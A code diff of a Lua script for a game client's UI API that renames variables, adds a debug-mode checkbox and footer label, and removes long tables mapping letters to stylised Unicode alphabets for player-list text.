-		var_0_22.debugMode = var_201_0
+ 	--#region DebugOptions
+	CPLua.DebugOptions = {}
+	CPLua.DebugOptions.enable = ui.new_checkbox('Lua', 'B', 'Debug Mode (console)')
+	ui.set_callback(CPLua.DebugOptions.enable, function(self)
+		local Status = ui.get(self)
+		Options.debugMode = Status
 	end)
+	--#endregion
 
-	var_10_0.Footer = ui.new_label("Lua", "B", "=========  [   $CP Finish   ]  =========")
+	CPLua.Footer = ui.new_label('Lua', 'B', '=========  [   $CP Finish   ]  =========')
 
-	client.set_event_callback("paint", function()
-		for iter_202_0, iter_202_1 in ipairs(var_10_0.loops) do
-			iter_202_1()
+	--#region Paint Draw Loops
+	client.set_event_callback('paint', function()
+		for index, func in ipairs(CPLua.loops) do
+			func()
 		end
 	end)
+	--#endregion
 
-	local var_10_42 = {
+	--#region Player List Adjustments
+	local style = {
 		letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' ",
 		trans = {
-			bold = {
-				"𝗮",
-				"𝗯",
-				"𝗰",
-				"𝗱",
-				"𝗲",
-				"𝗳",
-				"𝗴",
-				"𝗵",
-				"𝗶",
-				"𝗷",
-				"𝗸",
-				"𝗹",
-				"𝗺",
-				"𝗻",
-				"𝗼",
-				"𝗽",
-				"𝗾",
-				"𝗿",
-				"𝘀",
-				"𝘁",
-				"𝘂",
-				"𝘃",
-				"𝘄",
-				"𝘅",
-				"𝘆",
-				"𝘇",
-				"𝗔",
-				"𝗕",
-				"𝗖",
-				"𝗗",
-				"𝗘",
-				"𝗙",
-				"𝗚",
-				"𝗛",
-				"𝗜",
-				"𝗝",
-				"𝗞",
-				"𝗟",
-				"𝗠",
-				"𝗡",
-				"𝗢",
-				"𝗣",
-				"𝗤",
-				"𝗥",
-				"𝗦",
-				"𝗧",
-				"𝗨",
-				"𝗩",
-				"𝗪",
-				"𝗫",
-				"𝗬",
-				"𝗭",
-				"𝟬",
-				"𝟭",
-				"𝟮",
-				"𝟯",
-				"𝟰",
-				"𝟱",
-				"𝟲",
-				"𝟳",
-				"𝟴",
-				"𝟵",
-				"'",
-				" "
-			},
-			bolditalic = {
-				"𝙖",
-				"𝙗",
-				"𝙘",
-				"𝙙",
-				"𝙚",
-				"𝙛",
-				"𝙜",
-				"𝙝",
-				"𝙞",
-				"𝙟",
-				"𝙠",
-				"𝙡",
-				"𝙢",
-				"𝙣",
-				"𝙤",
-				"𝙥",
-				"𝙦",
-				"𝙧",
-				"𝙨",
-				"𝙩",
-				"𝙪",
-				"𝙫",
-				"𝙬",
-				"𝙭",
-				"𝙮",
-				"𝙯",
-				"𝘼",
-				"𝘽",
-				"𝘾",
-				"𝘿",
-				"𝙀",
-				"𝙁",
-				"𝙂",
-				"𝙃",
-				"𝙄",
-				"𝙅",
-				"𝙆",
-				"𝙇",
-				"𝙈",
-				"𝙉",
-				"𝙊",
-				"𝙋",
-				"𝙌",
-				"𝙍",
-				"𝙎",
-				"𝙏",
-				"𝙐",
-				"𝙑",
-				"𝙒",
-				"𝙓",
-				"𝙔",
-				"𝙕",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			italic = {
-				"𝘢",
-				"𝘣",
-				"𝘤",
-				"𝘥",
-				"𝘦",
-				"𝘧",
-				"𝘨",
-				"𝘩",
-				"𝘪",
-				"𝘫",
-				"𝘬",
-				"𝘭",
-				"𝘮",
-				"𝘯",
-				"𝘰",
-				"𝘱",
-				"𝘲",
-				"𝘳",
-				"𝘴",
-				"𝘵",
-				"𝘶",
-				"𝘷",
-				"𝘸",
-				"𝘹",
-				"𝘺",
-				"𝘻",
-				"𝘈",
-				"𝘉",
-				"𝘊",
-				"𝘋",
-				"𝘌",
-				"𝘍",
-				"𝘎",
-				"𝘏",
-				"𝘐",
-				"𝘑",
-				"𝘒",
-				"𝘓",
-				"𝘔",
-				"𝘕",
-				"𝘖",
-				"𝘗",
-				"𝘘",
-				"𝘙",
-				"𝘚",
-				"𝘛",
-				"𝘜",
-				"𝘝",
-				"𝘞",
-				"𝘟",
-				"𝘠",
-				"𝘡",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			circled = {
-				"ⓐ",
-				"ⓑ",
-				"ⓒ",
-				"ⓓ",
-				"ⓔ",
-				"ⓕ",
-				"ⓖ",
-				"ⓗ",
-				"ⓘ",
-				"ⓙ",
-				"ⓚ",
-				"ⓛ",
-				"ⓜ",
-				"ⓝ",
-				"ⓞ",
-				"ⓟ",
-				"ⓠ",
-				"ⓡ",
-				"ⓢ",
-				"ⓣ",
-				"ⓤ",
-				"ⓥ",
-				"ⓦ",
-				"ⓧ",
-				"ⓨ",
-				"ⓩ",
-				"Ⓐ",
-				"Ⓑ",
-				"Ⓒ",
-				"Ⓓ",
-				"Ⓔ",
-				"Ⓕ",
-				"Ⓖ",
-				"Ⓗ",
-				"Ⓘ",
-				"Ⓙ",
-				"Ⓚ",
-				"Ⓛ",
-				"Ⓜ",
-				"Ⓝ",
-				"Ⓞ",
-				"Ⓟ",
-				"Ⓠ",
-				"Ⓡ",
-				"Ⓢ",
-				"Ⓣ",
-				"Ⓤ",
-				"Ⓥ",
-				"Ⓦ",
-				"Ⓧ",
-				"Ⓨ",
-				"Ⓩ",
-				"0",
-				"①",
-				"②",
-				"③",
-				"④",
-				"⑤",
-				"⑥",
-				"⑦",
-				"⑧",
-				"⑨",
-				"'",
-				" "
-			},
-			circledNeg = {
-				"🅐",
-				"🅑",
-				"🅒",
-				"🅓",
-				"🅔",
-				"🅕",
-				"🅖",
-				"🅗",
-				"🅘",
-				"🅙",
-				"🅚",
-				"🅛",
-				"🅜",
-				"🅝",
-				"🅞",
-				"🅟",
-				"🅠",
-				"🅡",
-				"🅢",
-				"🅣",
-				"🅤",
-				"🅥",
-				"🅦",
-				"🅧",
-				"🅨",
-				"🅩",
-				"🅐",
-				"🅑",
-				"🅒",
-				"🅓",
-				"🅔",
-				"🅕",
-				"🅖",
-				"🅗",
-				"🅘",
-				"🅙",
-				"🅚",
-				"🅛",
-				"🅜",
-				"🅝",
-				"🅞",
-				"🅟",
-				"🅠",
-				"🅡",
-				"🅢",
-				"🅣",
-				"🅤",
-				"🅥",
-				"🅦",
-				"🅧",
-				"🅨",
-				"🅩",
-				"⓿",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			fullwidth = {
-				"ａ",
-				"ｂ",
-				"ｃ",
-				"ｄ",
-				"ｅ",
-				"ｆ",
-				"ｇ",
-				"ｈ",
-				"ｉ",
-				"ｊ",
-				"ｋ",
-				"ｌ",
-				"ｍ",
-				"ｎ",
-				"ｏ",
-				"ｐ",
-				"ｑ",
-				"ｒ",
-				"ｓ",
-				"ｔ",
-				"ｕ",
-				"ｖ",
-				"ｗ",
-				"ｘ",
-				"ｙ",
-				"ｚ",
-				"Ａ",
-				"Ｂ",
-				"Ｃ",
-				"Ｄ",
-				"Ｅ",
-				"Ｆ",
-				"Ｇ",
-				"Ｈ",
-				"Ｉ",
-				"Ｊ",
-				"Ｋ",
-				"Ｌ",
-				"Ｍ",
-				"Ｎ",
-				"Ｏ",
-				"Ｐ",
-				"Ｑ",
-				"Ｒ",
-				"Ｓ",
-				"Ｔ",
-				"Ｕ",
-				"Ｖ",
-				"Ｗ",
-				"Ｘ",
-				"Ｙ",
-				"Ｚ",
-				"０",
-				"１",
-				"２",
-				"３",
-				"４",
-				"５",
-				"６",
-				"７",
-				"８",
-				"９",
-				"＇",
-				"　"
-			},
-			fraktur = {
-				"𝔞",
-				"𝔟",
-				"𝔠",
-				"𝔡",
-				"𝔢",
-				"𝔣",
-				"𝔤",
-				"𝔥",
-				"𝔦",
-				"𝔧",
-				"𝔨",
-				"𝔩",
-				"𝔪",
-				"𝔫",
-				"𝔬",
-				"𝔭",
-				"𝔮",
-				"𝔯",
-				"𝔰",
-				"𝔱",
-				"𝔲",
-				"𝔳",
-				"𝔴",
-				"𝔵",
-				"𝔶",
-				"𝔷",
-				"𝔄",
-				"𝔅",
-				"ℭ",
-				"𝔇",
-				"𝔈",
-				"𝔉",
-				"𝔊",
-				"ℌ",
-				"ℑ",
-				"𝔍",
-				"𝔎",
-				"𝔏",
-				"𝔐",
-				"𝔑",
-				"𝔒",
-				"𝔓",
-				"𝔔",
-				"ℜ",
-				"𝔖",
-				"𝔗",
-				"𝔘",
-				"𝔙",
-				"𝔚",
-				"𝔛",
-				"𝔜",
-				"ℨ",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			frakturbold = {
-				"𝖆",
-				"𝖇",
-				"𝖈",
-				"𝖉",
-				"𝖊",
-				"𝖋",
-				"𝖌",
-				"𝖍",
-				"𝖎",
-				"𝖏",
-				"𝖐",
-				"𝖑",
-				"𝖒",
-				"𝖓",
-				"𝖔",
-				"𝖕",
-				"𝖖",
-				"𝖗",
-				"𝖘",
-				"𝖙",
-				"𝖚",
-				"𝖛",
-				"𝖜",
-				"𝖝",
-				"𝖞",
-				"𝖟",
-				"𝕬",
-				"𝕭",
-				"𝕮",
-				"𝕯",
-				"𝕰",
-				"𝕱",
-				"𝕲",
-				"𝕳",
-				"𝕴",
-				"𝕵",
-				"𝕶",
-				"𝕷",
-				"𝕸",
-				"𝕹",
-				"𝕺",
-				"𝕻",
-				"𝕼",
-				"𝕽",
-				"𝕾",
-				"𝕿",
-				"𝖀",
-				"𝖁",
-				"𝖂",
-				"𝖃",
-				"𝖄",
-				"𝖅",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			script = {
-				"𝓪",
-				"𝓫",
-				"𝓬",
-				"𝓭",
-				"𝓮",
-				"𝓯",
-				"𝓰",
-				"𝓱",
-				"𝓲",
-				"𝓳",
-				"𝓴",
-				"𝓵",
-				"𝓶",
-				"𝓷",
-				"𝓸",
-				"𝓹",
-				"𝓺",
-				"𝓻",
-				"𝓼",
-				"𝓽",
-				"𝓾",
-				"𝓿",
-				"𝔀",
-				"𝔁",
-				"𝔂",
-				"𝔃",
-				"𝓐",
-				"𝓑",
-				"𝓒",
-				"𝓓",
-				"𝓔",
-				"𝓕",
-				"𝓖",
-				"𝓗",
-				"𝓘",
-				"𝓙",
-				"𝓚",
-				"𝓛",
-				"𝓜",
-				"𝓝",
-				"𝓞",
-				"𝓟",
-				"𝓠",
-				"𝓡",
-				"𝓢",
-				"𝓣",
-				"𝓤",
-				"𝓥",
-				"𝓦",
-				"𝓧",
-				"𝓨",
-				"𝓩",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			doublestruck = {
-				"𝕒",
-				"𝕓",
-				"𝕔",
-				"𝕕",
-				"𝕖",
-				"𝕗",
-				"𝕘",
-				"𝕙",
-				"𝕚",
-				"𝕛",
-				"𝕜",
-				"𝕝",
-				"𝕞",
-				"𝕟",
-				"𝕠",
-				"𝕡",
-				"𝕢",
-				"𝕣",
-				"𝕤",
-				"𝕥",
-				"𝕦",
-				"𝕧",
-				"𝕨",
-				"𝕩",
-				"𝕪",
-				"𝕫",
-				"𝔸",
-				"𝔹",
-				"ℂ",
-				"𝔻",
-				"𝔼",
-				"𝔽",
-				"𝔾",
-				"ℍ",
-				"𝕀",
-				"𝕁",
-				"𝕂",
-				"𝕃",
-				"𝕄",
-				"ℕ",
-				"𝕆",
-				"ℙ",
-				"ℚ",
-				"ℝ",
-				"𝕊",
-				"𝕋",
-				"𝕌",
-				"𝕍",
-				"𝕎",
-				"𝕏",
-				"𝕐",
-				"ℤ",
-				"𝟘",
-				"𝟙",
-				"𝟚",
-				"𝟛",
-				"𝟜",
-				"𝟝",
-				"𝟞",
-				"𝟟",
-				"𝟠",
-				"𝟡",
-				"'",
-				" "
-			},
-			monospace = {
-				"𝚊",
-				"𝚋",
-				"𝚌",
-				"𝚍",
-				"𝚎",
-				"𝚏",
-				"𝚐",
-				"𝚑",
-				"𝚒",
-				"𝚓",
-				"𝚔",
-				"𝚕",
-				"𝚖",
-				"𝚗",
-				"𝚘",
-				"𝚙",
-				"𝚚",
-				"𝚛",
-				"𝚜",
-				"𝚝",
-				"𝚞",
-				"𝚟",
-				"𝚠",
-				"𝚡",
-				"𝚢",
-				"𝚣",
-				"𝙰",
-				"𝙱",
-				"𝙲",
-				"𝙳",
-				"𝙴",
-				"𝙵",
-				"𝙶",
-				"𝙷",
-				"𝙸",
-				"𝙹",
-				"𝙺",
-				"𝙻",
-				"𝙼",
-				"𝙽",
-				"𝙾",
-				"𝙿",
-				"𝚀",
-				"𝚁",
-				"𝚂",
-				"𝚃",
-				"𝚄",
-				"𝚅",
-				"𝚆",
-				"𝚇",
-				"𝚈",
-				"𝚉",
-				"𝟶",
-				"𝟷",
-				"𝟸",
-				"𝟹",
-				"𝟺",
-				"𝟻",
-				"𝟼",
-				"𝟽",
-				"𝟾",
-				"𝟿",
-				"'",
-				" "
-			},
-			parenthesized = {
-				"⒜",
-				"⒝",
-				"⒞",
-				"⒟",
-				"⒠",
-				"⒡",
-				"⒢",
-				"⒣",
-				"⒤",
-				"⒥",
-				"⒦",
-				"⒧",
-				"⒨",
-				"⒩",
-				"⒪",
-				"⒫",
-				"⒬",
-				"⒭",
-				"⒮",
-				"⒯",
-				"⒰",
-				"⒱",
-				"⒲",
-				"⒳",
-				"⒴",
-				"⒵",
-				"⒜",
-				"⒝",
-				"⒞",
-				"⒟",
-				"⒠",
-				"⒡",
-				"⒢",
-				"⒣",
-				"⒤",
-				"⒥",
-				"⒦",
-				"⒧",
-				"⒨",
-				"⒩",
-				"⒪",
-				"⒫",
-				"⒬",
-				"⒭",
-				"⒮",
-				"⒯",
-				"⒰",
-				"⒱",
-				"⒲",
-				"⒳",
-				"⒴",
-				"⒵",
-				"0",
-				"⑴",
-				"⑵",
-				"⑶",
-				"⑷",
-				"⑸",
-				"⑹",
-				"⑺",
-				"⑻",
-				"⑼",
-				"'",
-				" "
-			},
-			regional = {
-				"🇦",
-				"🇧",
-				"🇨",
-				"🇩",
-				"🇪",
-				"🇫",
-				"🇬",
-				"🇭",
-				"🇮",
-				"🇯",
-				"🇰",
-				"🇱",
-				"🇲",
-				"🇳",
-				"🇴",
-				"🇵",
-				"🇶",
-				"🇷",
-				"🇸",
-				"🇹",
-				"🇺",
-				"🇻",
-				"🇼",
-				"🇽",
-				"🇾",
-				"🇿",
-				"🇦",
-				"🇧",
-				"🇨",
-				"🇩",
-				"🇪",
-				"🇫",
-				"🇬",
-				"🇭",
-				"🇮",
-				"🇯",
-				"🇰",
-				"🇱",
-				"🇲",
-				"🇳",
-				"🇴",
-				"🇵",
-				"🇶",
-				"🇷",
-				"🇸",
-				"🇹",
-				"🇺",
-				"🇻",
-				"🇼",
-				"🇽",
-				"🇾",
-				"🇿",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			squared = {
-				"🄰",
-				"🄱",
-				"🄲",
-				"🄳",
-				"🄴",
-				"🄵",
-				"🄶",
-				"🄷",
-				"🄸",
-				"🄹",
-				"🄺",
-				"🄻",
-				"🄼",
-				"🄽",
-				"🄾",
-				"🄿",
-				"🅀",
-				"🅁",
-				"🅂",
-				"🅃",
-				"🅄",
-				"🅅",
-				"🅆",
-				"🅇",
-				"🅈",
-				"🅉",
-				"🄰",
-				"🄱",
-				"🄲",
-				"🄳",
-				"🄴",
-				"🄵",
-				"🄶",
-				"🄷",
-				"🄸",
-				"🄹",
-				"🄺",
-				"🄻",
-				"🄼",
-				"🄽",
-				"🄾",
-				"🄿",
-				"🅀",
-				"🅁",
-				"🅂",
-				"🅃",
-				"🅄",
-				"🅅",
-				"🅆",
-				"🅇",
-				"🅈",
-				"🅉",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			squaredNeg = {
-				"🅰",
-				"🅱",
-				"🅲",
-				"🅳",
-				"🅴",
-				"🅵",
-				"🅶",
-				"🅷",
-				"🅸",
-				"🅹",
-				"🅺",
-				"🅻",
-				"🅼",
-				"🅽",
-				"🅾",
-				"🅿",
-				"🆀",
-				"🆁",
-				"🆂",
-				"🆃",
-				"🆄",
-				"🆅",
-				"🆆",
-				"🆇",
-				"🆈",
-				"🆉",
-				"🅰",
-				"🅱",
-				"🅲",
-				"🅳",
-				"🅴",
-				"🅵",
-				"🅶",
-				"🅷",
-				"🅸",
-				"🅹",
-				"🅺",
-				"🅻",
-				"🅼",
-				"🅽",
-				"🅾",
-				"🅿",
-				"🆀",
-				"🆁",
-				"🆂",
-				"🆃",
-				"🆄",
-				"🆅",
-				"🆆",
-				"🆇",
-				"🆈",
-				"🆉",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			acute = {
-				"á",
-				"b",
-				"ć",
-				"d",
-				"é",
-				"f",
-				"ǵ",
-				"h",
-				"í",
-				"j",
-				"ḱ",
-				"ĺ",
-				"ḿ",
-				"ń",
-				"ő",
-				"ṕ",
-				"q",
-				"ŕ",
-				"ś",
-				"t",
-				"ú",
-				"v",
-				"ẃ",
-				"x",
-				"ӳ",
-				"ź",
-				"Á",
-				"B",
-				"Ć",
-				"D",
-				"É",
-				"F",
-				"Ǵ",
-				"H",
-				"í",
-				"J",
-				"Ḱ",
-				"Ĺ",
-				"Ḿ",
-				"Ń",
-				"Ő",
-				"Ṕ",
-				"Q",
-				"Ŕ",
-				"ś",
-				"T",
-				"Ű",
-				"V",
-				"Ẃ",
-				"X",
-				"Ӳ",
-				"Ź",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			thai = {
-				"ﾑ",
-				"乃",
-				"c",
-				"d",
-				"乇",
-				"ｷ",
-				"g",
-				"ん",
-				"ﾉ",
-				"ﾌ",
-				"ズ",
-				"ﾚ",
-				"ﾶ",
-				"刀",
-				"o",
-				"ｱ",
-				"q",
-				"尺",
-				"丂",
-				"ｲ",
-				"u",
-				"√",
-				"w",
-				"ﾒ",
-				"ﾘ",
-				"乙",
-				"ﾑ",
-				"乃",
-				"c",
-				"d",
-				"乇",
-				"ｷ",
-				"g",
-				"ん",
-				"ﾉ",
-				"ﾌ",
-				"ズ",
-				"ﾚ",
-				"ﾶ",
-				"刀",
-				"o",
-				"ｱ",
-				"q",
-				"尺",
-				"丂",
-				"ｲ",
-				"u",
-				"√",
-				"w",
-				"ﾒ",
-				"ﾘ",
-				"乙",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			curvy1 = {
-				"ค",
-				"๒",
-				"ƈ",
-				"ɗ",
-				"ﻉ",
-				"ि",
-				"ﻭ",
-				"ɦ",
-				"ٱ",
-				"ﻝ",
-				"ᛕ",
-				"ɭ",
-				"๓",
-				"ก",
-				"ѻ",
-				"ρ",
-				"۹",
-				"ɼ",
-				"ร",
-				"Շ",
-				"પ",
-				"۷",
-				"ฝ",
-				"ซ",
-				"ץ",
-				"չ",
-				"ค",
-				"๒",
-				"ƈ",
-				"ɗ",
-				"ﻉ",
-				"ि",
-				"ﻭ",
-				"ɦ",
-				"ٱ",
-				"ﻝ",
-				"ᛕ",
-				"ɭ",
-				"๓",
-				"ก",
-				"ѻ",
-				"ρ",
-				"۹",
-				"ɼ",
-				"ร",
-				"Շ",
-				"પ",
-				"۷",
-				"ฝ",
-				"ซ",
-				"ץ",
-				"չ",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			curvy2 = {
-				"α",
-				"в",
-				"¢",
-				"∂",
-				"є",
-				"ƒ",
-				"ﻭ",
-				"н",
-				"ι",
-				"נ",
-				"к",
-				"ℓ",
-				"м",
-				"η",
-				"σ",
-				"ρ",
-				"۹",
-				"я",
-				"ѕ",
-				"т",
-				"υ",
-				"ν",
-				"ω",
-				"χ",
-				"у",
-				"չ",
-				"α",
-				"в",
-				"¢",
-				"∂",
-				"є",
-				"ƒ",
-				"ﻭ",
-				"н",
-				"ι",
-				"נ",
-				"к",
-				"ℓ",
-				"м",
-				"η",
-				"σ",
-				"ρ",
-				"۹",
-				"я",
-				"ѕ",
-				"т",
-				"υ",
-				"ν",
-				"ω",
-				"χ",
-				"у",
-				"չ",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			curvy3 = {
-				"ค",
-				"๒",
-				"ς",
-				"๔",
-				"є",
-				"Ŧ",
-				"ﻮ",
-				"ђ",
-				"เ",
-				"ן",
-				"к",
-				"ɭ",
-				"๓",
-				"ภ",
-				"๏",
-				"ק",
-				"ợ",
-				"г",
-				"ร",
-				"Շ",
-				"ย",
-				"ש",
-				"ฬ",
-				"א",
-				"ץ",
-				"չ",
-				"ค",
-				"๒",
-				"ς",
-				"๔",
-				"є",
-				"Ŧ",
-				"ﻮ",
-				"ђ",
-				"เ",
-				"ן",
-				"к",
-				"ɭ",
-				"๓",
-				"ภ",
-				"๏",
-				"ק",
-				"ợ",
-				"г",
-				"ร",
-				"Շ",
-				"ย",
-				"ש",
-				"ฬ",
-				"א",
-				"ץ",
-				"չ",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			fauxcryllic = {
-				"а",
-				"ъ",
-				"с",
-				"ↁ",
-				"э",
-				"f",
-				"Б",
-				"Ђ",
-				"і",
-				"ј",
-				"к",
-				"l",
-				"м",
-				"и",
-				"о",
-				"р",
-				"q",
-				"ѓ",
-				"ѕ",
-				"т",
-				"ц",
-				"v",
-				"ш",
-				"х",
-				"Ў",
-				"z",
-				"Д",
-				"Б",
-				"Ҁ",
-				"ↁ",
-				"Є",
-				"F",
-				"Б",
-				"Н",
-				"І",
-				"Ј",
-				"Ќ",
-				"L",
-				"М",
-				"И",
-				"Ф",
-				"Р",
-				"Q",
-				"Я",
-				"Ѕ",
-				"Г",
-				"Ц",
-				"V",
-				"Щ",
-				"Ж",
-				"Ч",
-				"Z",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			rockdots = {
-				"ä",
-				"ḅ",
-				"ċ",
-				"ḋ",
-				"ë",
-				"ḟ",
-				"ġ",
-				"ḧ",
-				"ï",
-				"j",
-				"ḳ",
-				"ḷ",
-				"ṁ",
-				"ṅ",
-				"ö",
-				"ṗ",
-				"q",
-				"ṛ",
-				"ṡ",
-				"ẗ",
-				"ü",
-				"ṿ",
-				"ẅ",
-				"ẍ",
-				"ÿ",
-				"ż",
-				"Ä",
-				"Ḅ",
-				"Ċ",
-				"Ḋ",
-				"Ё",
-				"Ḟ",
-				"Ġ",
-				"Ḧ",
-				"Ї",
-				"J",
-				"Ḳ",
-				"Ḷ",
-				"Ṁ",
-				"Ṅ",
-				"Ö",
-				"Ṗ",
-				"Q",
-				"Ṛ",
-				"Ṡ",
-				"Ṫ",
-				"Ü",
-				"Ṿ",
-				"Ẅ",
-				"Ẍ",
-				"Ÿ",
-				"Ż",
-				"0",
-				"1",
-				"2",
-				"ӟ",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			smallcaps = {
-				"ᴀ",
-				"ʙ",
-				"ᴄ",
-				"ᴅ",
-				"ᴇ",
-				"ꜰ",
-				"ɢ",
-				"ʜ",
-				"ɪ",
-				"ᴊ",
-				"ᴋ",
-				"ʟ",
-				"ᴍ",
-				"ɴ",
-				"ᴏ",
-				"ᴩ",
-				"q",
-				"ʀ",
-				"ꜱ",
-				"ᴛ",
-				"ᴜ",
-				"ᴠ",
-				"ᴡ",
-				"x",
-				"y",
-				"ᴢ",
-				"ᴀ",
-				"ʙ",
-				"ᴄ",
-				"ᴅ",
-				"ᴇ",
-				"ꜰ",
-				"ɢ",
-				"ʜ",
-				"ɪ",
-				"ᴊ",
-				"ᴋ",
-				"ʟ",
-				"ᴍ",
-				"ɴ",
-				"ᴏ",
-				"ᴩ",
-				"Q",
-				"ʀ",
-				"ꜱ",
-				"ᴛ",
-				"ᴜ",
-				"ᴠ",
-				"ᴡ",
-				"x",
-				"Y",
-				"ᴢ",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			stroked = {
-				"Ⱥ",
-				"ƀ",
-				"ȼ",
-				"đ",
-				"ɇ",
-				"f",
-				"ǥ",
-				"ħ",
-				"ɨ",
-				"ɉ",
-				"ꝁ",
-				"ł",
-				"m",
-				"n",
-				"ø",
-				"ᵽ",
-				"ꝗ",
-				"ɍ",
-				"s",
-				"ŧ",
-				"ᵾ",
-				"v",
-				"w",
-				"x",
-				"ɏ",
-				"ƶ",
-				"Ⱥ",
-				"Ƀ",
-				"Ȼ",
-				"Đ",
-				"Ɇ",
-				"F",
-				"Ǥ",
-				"Ħ",
-				"Ɨ",
-				"Ɉ",
-				"Ꝁ",
-				"Ł",
-				"M",
-				"N",
-				"Ø",
-				"Ᵽ",
-				"Ꝗ",
-				"Ɍ",
-				"S",
-				"Ŧ",
-				"ᵾ",
-				"V",
-				"W",
-				"X",
-				"Ɏ",
-				"Ƶ",
-				"0",
-				"1",
-				"ƻ",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				"'",
-				" "
-			},
-			subscript = {
-				"ₐ",
-				"b",
-				"c",
-				"d",
-				"ₑ",
-				"f",
-				"g",
-				"ₕ",
-				"ᵢ",
-				"ⱼ",
-				"ₖ",
-				"ₗ",
-				"ₘ",
-				"ₙ",
-				"ₒ",
-				"ₚ",
-				"q",
-				"ᵣ",
-				"ₛ",
-				"ₜ",
-				"ᵤ",
-				"ᵥ",
-				"w",
-				"ₓ",
-				"y",
-				"z",
-				"ₐ",
-				"B",
-				"C",
-				"D",
-				"ₑ",
-				"F",
-				"G",
-				"ₕ",
-				"ᵢ",
-				"ⱼ",
-				"ₖ",
-				"ₗ",
-				"ₘ",
-				"ₙ",
-				"ₒ",
-				"ₚ",
-				"Q",
-				"ᵣ",
-				"ₛ",
-				"ₜ",
-				"ᵤ",
-				"ᵥ",
-				"W",
-				"ₓ",
-				"Y",
-				"Z",
-				"₀",
-				"₁",
-				"₂",
-				"₃",
-				"₄",
-				"₅",
-				"₆",
-				"₇",
-				"₈",
-				"₉",
-				"'",
-				" "
-			},
-			superscript = {
-				"ᵃ",
-				"ᵇ",
-				"ᶜ",
-				"ᵈ",
-				"ᵉ",
-				"ᶠ",
-				"ᵍ",
-				"ʰ",
-				"ⁱ",
-				"ʲ",
-				"ᵏ",
-				"ˡ",
-				"ᵐ",
-				"ⁿ",
-				"ᵒ",
-				"ᵖ",
-				"q",
-				"ʳ",
-				"ˢ",
-				"ᵗ",
-				"ᵘ",
-				"ᵛ",
-				"ʷ",
-				"ˣ",
-				"ʸ",
-				"ᶻ",
-				"ᴬ",
-				"ᴮ",
-				"ᶜ",
-				"ᴰ",
-				"ᴱ",
-				"ᶠ",
-				"ᴳ",
-				"ᴴ",
-				"ᴵ",
-				"ᴶ",
-				"ᴷ",
-				"ᴸ",
-				"ᴹ",
-				"ᴺ",
-				"ᴼ",
-				"ᴾ",
-				"Q",
-				"ᴿ",
-				"ˢ",
-				"ᵀ",
-				"ᵁ",
-				"ⱽ",
-				"ᵂ",
-				"ˣ",
-				"ʸ",
-				"ᶻ",
-				"⁰",
-				"¹",
-				"²",
-				"³",
-				"⁴",
-				"⁵",
-				"⁶",
-				"⁷",
-				"⁸",
-				"⁹",
-				"'",
-				" "
-			},
-			inverted = {
-				"ɐ",
-				"q",
-				"ɔ",
-				"p",
-				"ǝ",
-				"ɟ",
-				"ƃ",
-				"ɥ",
-				"ı",
-				"ɾ",
-				"ʞ",
-				"ן",
-				"ɯ",
-				"u",
-				"o",
-				"d",
-				"b",
-				"ɹ",
-				"s",
-				"ʇ",
-				"n",
-				"ʌ",
-				"ʍ",
-				"x",
-				"ʎ",
-				"z",
-				"ɐ",
-				"q",
-				"ɔ",
-				"p",
-				"ǝ",
-				"ɟ",
-				"ƃ",
-				"ɥ",
-				"ı",
-				"ɾ",
-				"ʞ",
-				"ן",
-				"ɯ",
-				"u",
-				"o",
-				"d",
-				"b",
-				"ɹ",
-				"s",
-				"ʇ",
-				"n",
-				"𐌡",
-				"ʍ",
-				"x",
-				"ʎ",
-				"z",
-				"0",
-				"1",
-				"2",
-				"3",
-				"4",
-				"5",
-				"6",
-				"7",
-				"8",
-				"9",
-				",",
-				" "
-			}
